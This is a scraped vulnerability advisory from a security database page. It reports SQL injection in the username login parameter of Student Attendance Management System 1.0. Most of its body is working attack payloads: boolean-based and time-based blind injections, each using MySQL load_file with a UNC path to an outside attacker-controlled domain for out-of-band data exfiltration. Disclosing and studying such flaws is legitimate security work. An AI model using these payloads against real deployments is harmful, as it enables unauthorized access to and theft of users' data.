---
title: Student Attendance Management System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022120052
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-01
fetch_date: 2025-10-04T02:49:33.275711
---

# Student Attendance Management System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Student Attendance Management System 1.0 SQL Injection** **2022.12.31**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Student-Attendance-Management-System 1.0 from Erick O. Omundi Multiple-SQLi
## Author: nu11secur1ty
## Date: 12.25.2022
## Vendor: https://github.com/rickxy
## Software: https://github.com/rickxy/Student-Attendance-Management-System
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/rickxy/2022/Student-Attendance-Management-System
## Description:
The `username` parameter appears to be vulnerable to Multiple-SQL
injection attacks.
The attacker can retrieve all sensitive information about the users of
this system and more bad things.
## STATUS: CRITICAL Vulnerability
[+] Payload:
```MySQL
---
Parameter: username (POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY
or GROUP BY clause
Payload: userType=Administrator&username=lBPxXeUT'+(select
load\_file('\\\\eq8r4p3b9u6gn42v38f6ca4cf3lw9oxf03sqje8.erick\_from\_America.com\\khw'))+''
RLIKE (SELECT (CASE WHEN (6217=6217) THEN 0x6c42507858655554+(select
load\_file(0x5c5c5c5c6571387234703362397536676e343276333866366361346366336c77396f7866303373716a65382e657269636b5f66726f6d5f416d65726963612e636f6d5c5c6b6877))+''
ELSE 0x28 END)) AND 'FUJm'='FUJm&password=q2H!z4n!F1&login=Login
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: userType=Administrator&username=lBPxXeUT'+(select
load\_file('\\\\eq8r4p3b9u6gn42v38f6ca4cf3lw9oxf03sqje8.erick\_from\_America.com\\khw'))+''
AND (SELECT 8687 FROM (SELECT(SLEEP(7)))btHE) AND
'XFcq'='XFcq&password=q2H!z4n!F1&login=Login
---
```
## Reproduce:
[href]()https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/rickxy/2022/Student-Attendance-Management-System
## Proof and Exploit:
[href](https://streamable.com/goy6ka)
## Time spent
`00:30:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120052)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top